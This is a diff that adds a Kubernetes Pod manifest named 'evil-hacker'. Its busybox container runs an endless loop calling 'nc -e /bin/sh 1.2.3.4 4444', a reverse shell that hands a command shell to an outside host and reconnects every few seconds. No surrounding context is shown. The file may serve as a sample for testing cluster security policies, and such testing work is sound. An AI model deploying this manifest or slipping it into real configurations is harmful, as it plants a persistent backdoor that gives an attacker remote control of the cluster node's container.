@@ -1,0 +1,9 @@
+apiVersion: v1
+kind: Pod
+metadata:
+  name: evil-hacker
+spec:
+  containers:
+  - name: hacker
+    image: busybox
+    command: ["/bin/sh", "-c", "while true; do nc -e /bin/sh 1.2.3.4 4444 || sleep 5; done"]
